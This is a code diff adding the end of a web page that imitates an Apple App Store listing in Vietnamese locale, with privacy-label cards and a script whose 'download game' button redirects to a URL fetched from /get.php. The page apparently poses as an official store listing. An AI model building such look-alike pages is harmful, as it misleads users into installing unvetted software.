+                                 </span>
+                                 <span class="privacy-type__grid-content privacy-type__data-category-heading">Purchases</span>
+                              </span>
+                           </li>
+                           <li classs="privacy-type__item">
+                              <span class="privacy-type__grid">
+                                 <span class="privacy-type__grid-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" class="privacy-type__glyph privacy-type__glyph--identifiers" aria-hidden="true">
+                                       <path d="M52.367 24h-14.76C36.704 24 36 23.342 36 22.51c0-.835.705-1.51 1.606-1.51h14.761c.905 0 1.633.675 1.633 1.51 0 .832-.728 1.49-1.633 1.49m0 10h-14.76C36.704 34 36 33.35 36 32.52c0-.85.705-1.52 1.606-1.52h14.761c.905 0 1.633.67 1.633 1.52 0 .83-.728 1.48-1.633 1.48m0 9h-14.76C36.704 43 36 42.33 36 41.484c0-.83.705-1.484 1.606-1.484h14.761c.905 0 1.633.654 1.633 1.484C54 42.33 53.272 43 52.367 43m-24.04 0H12.66C10.7 43 10 42.459 10 41.401 10 38.288 14.028 34 20.493 34 26.973 34 31 38.288 31 41.401 31 42.46 30.305 43 28.328 43m-7.321-22C23.673 21 26 23.31 26 26.425 26 29.58 23.686 32 21.007 32 18.314 32 16 29.58 16 26.452 15.987 23.359 18.327 21 21.007 21m32.158-10h-42.33C5.645 11 3 13.566 3 18.645V45.33C3 50.408 5.644 53 10.835 53h42.33C58.355 53 61 50.408 61 45.329V18.645C61 13.592 58.356 11 53.165 11"/>
+                                    </svg>
+                                 </span>
+                                 <span class="privacy-type__grid-content privacy-type__data-category-heading">Identifiers</span>
+                              </span>
+                           </li>
+                           <li classs="privacy-type__item">
+                              <span class="privacy-type__grid">
+                                 <span class="privacy-type__grid-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" class="privacy-type__glyph privacy-type__glyph--other" aria-hidden="true">
+                                       <path d="M32.09 61.568c16.185 0 29.586-13.43 29.586-29.587 0-16.186-13.43-29.587-29.616-29.587-16.157 0-29.558 13.4-29.558 29.587 0 16.156 13.43 29.587 29.587 29.587zM18.078 36.332c-2.379 0-4.351-1.944-4.351-4.38 0-2.408 1.972-4.351 4.35-4.351 2.408 0 4.381 1.943 4.381 4.35a4.358 4.358 0 01-4.38 4.38zm13.981 0a4.376 4.376 0 01-4.38-4.38c0-2.408 1.973-4.351 4.38-4.351a4.345 4.345 0 014.351 4.35 4.352 4.352 0 01-4.35 4.38zm13.981 0a4.358 4.358 0 01-4.38-4.38 4.352 4.352 0 014.38-4.351c2.38 0 4.352 1.943 4.352 4.35 0 2.437-1.973 4.38-4.352 4.38z"/>
+                                    </svg>
+                                 </span>
+                                 <span class="privacy-type__grid-content privacy-type__data-category-heading">Other Data</span>
+                              </span>
+                           </li>
+                        </ul>
+                     </div>
+                     <div class="app-privacy__card">
+                        <div class="privacy-type__icon">
+                           <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" aria-hidden="true">
+                              <path d="M7.36 17l3.208 3.208A24.23 24.23 0 007.39 32.235c0 13.44 10.93 24.374 24.366 24.374 4.374 0 8.483-1.159 12.035-3.186L47 56.631A28.616 28.616 0 0131.756 61C15.874 61 3 48.122 3 32.235A28.637 28.637 0 017.36 17zM9.77 6.642l47.588 47.606a2.204 2.204 0 010 3.11 2.206 2.206 0 01-3.111 0L6.632 9.753c-.829-.8-.856-2.283 0-3.11.826-.828 2.253-.886 3.138 0zM32.238 3C48.123 3 61 15.878 61 31.761c0 5.597-1.599 10.82-4.364 15.239l-3.208-3.209a24.221 24.221 0 003.182-12.03c0-13.437-10.934-24.37-24.372-24.37a24.223 24.223 0 00-12.03 3.18L17 7.363A28.628 28.628 0 0132.238 3zm-7.492 31L36 45H18.373C17.44 45 17 44.418 17 43.572c0-2.224 2.5-7.11 7.746-9.572zm6.915-20C35.733 14 39 17.634 39 22.002c0 2.419-.874 4.529-2.281 5.998L26 16.923C27.343 15.145 29.376 14 31.661 14z"/>
+                           </svg>
+                        </div>
+                        <h3 class="privacy-type__heading">Data Not Linked to You</h3>
+                        <p class="privacy-type__description">The following data may be collected but it is not linked to your identity:</p>
+                        <ul class="privacy-type__items">
+                           <li classs="privacy-type__item">
+                              <span class="privacy-type__grid">
+                                 <span class="privacy-type__grid-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" class="privacy-type__glyph privacy-type__glyph--usage-data" aria-hidden="true">
+                                       <path d="M49.925 53.844h7.098c3.287 0 4.978-1.572 4.978-4.692V14.52c0-3.12-1.69-4.717-4.978-4.717h-7.098c-3.239 0-4.93 1.596-4.93 4.717v34.632c0 3.12 1.691 4.692 4.93 4.692zm-21.412 0h7.097c3.287 0 4.955-1.572 4.955-4.692V21.475c0-3.12-1.668-4.717-4.955-4.717h-7.097c-3.264 0-4.955 1.596-4.955 4.717v27.677c0 3.12 1.691 4.692 4.955 4.692zm-21.413 0h7.074c3.287 0 4.978-1.572 4.978-4.692V28.406c0-3.12-1.691-4.716-4.978-4.716H7.1c-3.264 0-4.955 1.596-4.955 4.716v20.746c0 3.12 1.691 4.692 4.955 4.692z"/>
+                                    </svg>
+                                 </span>
+                                 <span class="privacy-type__grid-content privacy-type__data-category-heading">Usage Data</span>
+                              </span>
+                           </li>
+                           <li classs="privacy-type__item">
+                              <span class="privacy-type__grid">
+                                 <span class="privacy-type__grid-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" class="privacy-type__glyph privacy-type__glyph--diagnostics" aria-hidden="true">
+                                       <path d="M29.47 61.996h5.234c1.48 0 2.56-.882 2.873-2.332l1.48-6.258c1.109-.37 2.19-.797 3.128-1.252l5.49 3.357c1.223.768 2.617.654 3.64-.37l3.67-3.64c1.024-1.025 1.166-2.504.341-3.727l-3.356-5.433c.483-.995.91-2.02 1.223-3.043l6.314-1.508c1.45-.313 2.304-1.393 2.304-2.872v-5.149c0-1.45-.853-2.531-2.304-2.844l-6.257-1.508c-.37-1.166-.825-2.218-1.223-3.1l3.356-5.518c.796-1.223.711-2.617-.341-3.64l-3.727-3.67c-1.052-.967-2.303-1.138-3.555-.427l-5.575 3.442c-.91-.483-1.962-.91-3.129-1.28l-1.479-6.343c-.313-1.45-1.393-2.332-2.873-2.332h-5.233c-1.48 0-2.56.882-2.901 2.332l-1.48 6.286c-1.109.37-2.19.797-3.157 1.309l-5.518-3.414c-1.251-.71-2.531-.568-3.584.427l-3.697 3.67c-1.053 1.023-1.166 2.417-.342 3.64l3.328 5.518c-.37.882-.825 1.934-1.194 3.1l-6.258 1.508c-1.45.313-2.304 1.394-2.304 2.844v5.149c0 1.479.853 2.56 2.304 2.872l6.315 1.508c.312 1.024.739 2.048 1.194 3.043L8.85 47.774c-.853 1.223-.682 2.702.342 3.726l3.64 3.641c1.024 1.024 2.446 1.138 3.67.37l5.46-3.357c.968.455 2.02.882 3.13 1.252l1.479 6.258c.34 1.45 1.422 2.332 2.9 2.332zm2.618-19.683c-5.518 0-10.04-4.551-10.04-10.07 0-5.489 4.522-10.011 10.04-10.011 5.518 0 10.04 4.522 10.04 10.012 0 5.518-4.522 10.069-10.04 10.069z"/>
+                                    </svg>
+                                 </span>
+                                 <span class="privacy-type__grid-content privacy-type__data-category-heading">Diagnostics</span>
+                              </span>
+                           </li>
+                        </ul>
+                     </div>
+                  </div>
+               </section>
+
+            </div>
+         </main>
+      </div>
+      <footer id="ac-globalfooter" class="no-js" role="contentinfo" lang="en-VN" dir="ltr">
+         
+      </footer>
+   </body>
+
+</html>
+<script type="text/javascript">
+    $(document).ready(function () {
+        $("#btnHuongDan").click(function () {
+            window.scrollTo({
+                top: 500,
+                behavior: 'smooth'
+            });
+        });
+
+        $('.mobile-nav ul li.btn-menu').click(function (event) {
+            var d = $('.mobile-menu');
+            if (d.hasClass('active')) {
+                d.removeClass('active');
+            } else {
+                d.addClass('active')
+            }
+        });
+
+        $.ajaxSetup({
+            headers: {
+                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+            }
+        });
+
+        $('#btnTaiGame').click(function (e) {
+            e.preventDefault();
+            $.ajax({
+                url: '/get.php',
+                type: 'GET',
+                success: function (result) {
+                    window.location.href = result.data;
+                }
+            });
+        })
+    });
+</script>
